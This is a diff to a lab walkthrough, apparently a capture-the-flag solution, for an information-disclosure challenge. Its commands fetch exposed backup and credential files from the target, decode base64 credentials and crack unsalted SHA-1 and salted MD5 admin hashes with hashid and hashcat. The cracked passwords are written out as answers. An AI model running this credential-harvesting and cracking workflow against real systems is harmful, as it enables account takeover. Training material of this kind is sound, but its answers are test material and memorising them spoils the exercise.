@@ -154,13 +154,13 @@ or fuzz `/private/` with feroxbuster/ffuf):
 ```
 # easy   — plaintext in the config backup:
 curl -s "$U/config.php.bak"                                        # ADMIN_PASS = S3ntinel!Admin
-# medium — base64-encoded in a legacy file:
-curl -s "$U/private/legacy_creds.b64" | grep -v '^#' | base64 -d   # admin:Sup3rStaging!99
-# hard   — unsalted hash in a user dump -> identify + crack:
-curl -s "$U/private/backup_users.txt"                              # admin:<sha1>
+# medium — base64-encoded (file is pure base64, decode directly):
+curl -s "$U/private/creds_medium.b64" | base64 -d                  # admin:Sup3rStaging!99
+# hard   — unsalted hash -> identify + crack:
+curl -s "$U/private/creds_hard.txt"                                # admin:<sha1>
 hashid '<sha1>'   # SHA-1 ; then:  hashcat -m 100 hash.txt rockyou.txt   -> chocolate
-# expert — salted hash (hash:salt) in an old backup -> crack with the matching mode:
-curl -s "$U/private/old_admin.bak"                                 # admin:<md5>:<salt>
+# expert — salted hash (hash:salt) -> crack with the matching mode:
+curl -s "$U/private/creds_expert.txt"                              # admin:<md5>:<salt>
 hashcat -m 10 hash.txt rockyou.txt   # feed 'hash:salt' (md5(pass.salt))  -> liverpool
 ```
 **Lesson:** "info disclosure" is rarely one plaintext file — leaked backups expose secrets at every
